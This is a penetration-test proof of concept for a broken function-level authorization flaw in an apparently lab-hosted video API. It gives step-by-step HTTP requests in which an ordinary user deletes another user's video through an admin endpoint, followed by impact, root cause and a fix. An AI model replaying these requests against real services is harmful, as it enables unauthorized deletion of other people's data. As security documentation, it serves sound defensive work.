# Broken Function Level Authorization (BFLA) - Proof of Concept

## Summary

The application exposes an admin-level endpoint (`/identity/api/v2/admin/videos/{id}`) that can be accessed by a normal authenticated user. The backend fails to enforce role-based authorization, allowing privilege escalation.

---

## Steps to Reproduce

### 1. Authenticate as Victim (Create Resource)

```http
POST /identity/api/auth/login HTTP/1.1
Host: pentest.lab:8888
Content-Type: application/json

{
  "email": "victim@mail.com",
  "password": "Password123!"
}
```

Use the returned token to create/update a video:

```http
PUT /identity/api/v2/user/videos/102 HTTP/1.1
Host: pentest.lab:8888
Authorization: Bearer <victim_token>
Content-Type: application/json

{
  "videoName": "test-video.mp4"
}
```

✅ Video with ID `102` is created/owned by the victim.

---

### 2. Authenticate as Attacker

```http
POST /identity/api/auth/login HTTP/1.1
Host: pentest.lab:8888
Content-Type: application/json

{
  "email": "attacker@mail.com",
  "password": "Password123!"
}
```

Extract attacker token:

```
attacker_token = eyJhbGciOiJSUzI1NiJ9...
```

---

### 3. Attempt Normal Deletion (Expected to Fail)

```http
DELETE /identity/api/v2/user/videos/102 HTTP/1.1
Host: pentest.lab:8888
Authorization: Bearer <attacker_token>
```

### Response:

```json
{
  "message": "This is an admin function. Try to access the admin API",
  "status": 403
}
```

---

### 4. Bypass Authorization via Admin Endpoint

```http
DELETE /identity/api/v2/admin/videos/102 HTTP/1.1
Host: pentest.lab:8888
Authorization: Bearer <attacker_token>
Content-Type: application/json
```

---

## 🚨 Actual Result (Unauthorized Privilege Escalation)

```json
{
  "message": "User video deleted successfully.",
  "status": 200
}
```

---

## Expected Result

The request should be rejected:

```http
HTTP/1.1 403 Forbidden
```

---

## Impact

* Unauthorized deletion of other users’ content
* Privilege escalation from normal user → admin functionality
* Full compromise of user-generated content integrity
* Potential for mass data destruction

---

## Root Cause

* Missing role-based access control (RBAC) on `/admin` endpoints
* Backend trusts endpoint path instead of validating user role (`role` claim in JWT)

---

## Recommendation

Enforce strict authorization checks:

```python
if jwt.role != "admin":
    return 403 Forbidden
```

Additionally:

* Apply centralized authorization middleware
* Do not expose admin endpoints without strict enforcement
* Validate ownership for user-level operations

---

## Severity

Critical
